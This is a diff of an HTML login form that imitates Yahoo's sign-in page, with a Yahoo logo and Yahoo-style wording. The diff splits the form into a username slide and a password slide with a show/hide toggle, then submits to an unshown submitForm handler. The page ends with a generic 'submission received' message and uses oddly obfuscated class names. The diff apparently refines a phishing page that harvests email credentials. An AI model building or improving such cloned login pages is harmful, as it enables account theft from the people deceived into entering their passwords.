@@ -71,9 +71,10 @@
         <form onsubmit="submitForm(event)" class="form">
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
   
+          <!-- Slide 1: Username Entry -->
           <div class="mail">
               <h1 class="heading-2">Sign in</h1>
-              <div class="text-block-2">Sign in using your Yahoo account<br></div>
+              <div class="text-block-2">Sign in using your account<br></div>
               <div class="lpl numb">Username, Email or Mobile<br></div>
               <input class="field w-input" maxlength="256" name="name" placeholder="" type="email" id="name" required>
   
@@ -89,8 +90,8 @@
                   <div class="text-block-4">Forgotten username?</div>
               </div>
   
-              <!-- FIXED: This button now submits the form -->
-              <button type="submit" class="logger w-button">Next</button>
+              <!-- Next Button for Slide Navigation (Does NOT submit form) -->
+              <a href="#" class="nergzt logger w-button">Next</a>
   
               <a href="#" class="button logger w-button">Create an account</a>
               <div class="text-block-5">or</div>
@@ -99,6 +100,32 @@
                   <div class="text-block-6">Sign in with Google</div>
               </div>
           </div>
+  
+          <!-- Slide 2: Password Entry -->
+          <div class="pazzi nan">
+              <h1 class="heading-2"><strong>Enter password</strong></h1>
+              <div class="text-block-2">to finish signing in<br></div>
+              <div class="pazz lpl numb">Password<br></div>
+              <div class="ms-input-wrap">
+                  <input data-show="true" class="ms-input w-input" maxlength="256" name="password" placeholder="Enter your password" type="password" id="input-19" required>
+  
+                  <!-- Show/Hide Password Feature -->
+                  <div class="ms-password-wrap w-tabs">
+                      <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
+                          <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current">
+                              <img src="images/visible.png" loading="eager" alt="" class="image-4">
+                          </a>
+                          <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link">
+                              <img src="images/eye.png" loading="eager" alt="" class="image-4">
+                          </a>
+                      </div>
+                  </div>
+              </div>
+  
+              <!-- This is the actual form submission button -->
+              <button type="submit" class="logger w-button">Sign In</button>
+          </div>
+  
       </form>
         <div class="w-form-done">
           <div>Thank you! Your submission has been received!</div>
